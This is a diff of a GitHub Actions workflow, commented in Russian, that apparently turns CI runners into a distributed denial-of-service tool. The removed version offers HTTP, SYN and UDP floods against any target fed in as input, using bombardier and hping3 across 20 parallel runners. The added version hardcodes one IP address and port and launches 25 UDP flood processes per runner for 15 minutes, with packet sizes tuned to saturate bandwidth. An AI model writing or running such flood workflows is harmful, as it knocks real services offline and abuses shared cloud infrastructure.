@@ -1,64 +1,43 @@
-name: Ultimate Multi-Tool (HTTP/TCP/UDP)
+name: Hardcore UDP Stress Test
 
 on:
-  workflow_dispatch:
-    inputs:
-      method:
-        description: 'Выберите метод'
-        required: true
-        default: 'http'
-        type: choice
-        options:
-          - http
-          - tcp
-          - udp
-      target:
-        description: 'IP или URL (например: 1.1.1.1 или https://google.com)'
-        required: true
-      port:
-        description: 'Порт (только для TCP/UDP)'
-        required: false
-        default: '80'
+  workflow_dispatch: # Запуск вручную
 
 jobs:
-  stress-test:
+  flood:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
       matrix:
-        runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
-    
+        machine: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
     steps:
-      - name: Install Tools
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y hping3
-          wget https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64
-          chmod +x bombardier-linux-amd64
-          sudo mv bombardier-linux-amd64 /usr/local/bin/bombardier
+      - name: Install hping3
+        run: sudo apt-get update && sudo apt-get install -y hping3
 
-      - name: Run Attack
+      - name: Run Extreme UDP Flood
         run: |
-          METHOD="${{ github.event.inputs.method }}"
-          TARGET="${{ github.event.inputs.target }}"
-          PORT="${{ github.event.inputs.port }}"
+          echo "Starting extreme load from machine №${{ matrix.machine }}"
           
-          echo "Запуск $METHOD на $TARGET с машины №${{ matrix.runner }}"
+          # Настройка системы для максимального выхлопа
+          sudo sysctl -w net.ipv4.ip_local_port_range="1024 65535"
+          
+          # Цель
+          TARGET_IP="212.22.85.148"
+          TARGET_PORT="8500"
+          
+          # Запускаем 25 потоков в фоне
+          # -d 1350: Размер пакета (почти максимум MTU, чтобы забить Mbps)
+          # --flood: Гнать без пауз
+          # Мы НЕ используем --rand-source, чтобы трафик точно уходил
+          
+          for i in {1..25}; do
+            sudo hping3 --udp -p $TARGET_PORT -d 1350 --flood $TARGET_IP > /dev/null 2>&1 &
+          done
 
-          if [ "$METHOD" == "http" ]; then
-            # Бесконечный цикл для HTTP
-            while true; do
-              bombardier -c 1000 -d 300s --http2 -l "$TARGET?cache=$RANDOM"
-            done
-
-          elif [ "$METHOD" == "tcp" ]; then
-            # TCP SYN Flood (эмуляция множества подключений)
-            # --flood: максимально возможная скорость
-            # -S: установка SYN флага
-            sudo hping3 --flood -S -p $PORT $TARGET
-
-          elif [ "$METHOD" == "udp" ]; then
-            # UDP Flood
-            # --udp: использовать UDP протокол
-            sudo hping3 --flood --udp -p $PORT $TARGET
-          fi
+          # Тест будет идти 15 минут (900 секунд)
+          echo "Flood is running in 25 threads. Waiting..."
+          sleep 900
+          
+          # Останавливаем всё
+          sudo pkill hping3
